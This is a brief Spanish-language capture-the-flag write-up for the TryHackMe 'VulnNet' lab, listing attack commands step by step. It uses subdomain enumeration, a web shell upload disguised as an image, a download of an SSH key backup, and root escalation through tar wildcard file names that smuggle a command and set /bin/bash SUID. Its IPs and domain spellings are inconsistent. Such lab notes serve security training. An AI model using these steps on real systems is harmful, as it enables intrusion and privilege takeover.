# VulnNet - TryHackMe

**IP:** 10.10.73.97

## Descubrimiento
```bash
gobuster vhost -u http://10.10.24.117/ -w directory-list-2.3-medium.txt
```
- Subdominio: broadcast.vulnet.tlm

## Explotación
```bash
curl -u developers:9972761drmfsls -F "file=@shell.php5" -F "plupload=1" -F "name=shell.jpg" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
```

## SSH Access
```bash
curl -u developers:9972761drmfsls http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/ssh-backup.tar.gz -o ssh-backup.tar.gz
tar -xf ssh-backup.tar.gz
ssh -i id_rsa server-management@10.10.73.97
```

## Escalada de Privilegios
```bash
echo "chmod 4755 /bin/bash" > privesc.sh
echo "" > "--checkpoint-action=exec=sh privesc.sh"
echo "" > --checkpoint=1
bash -p
```
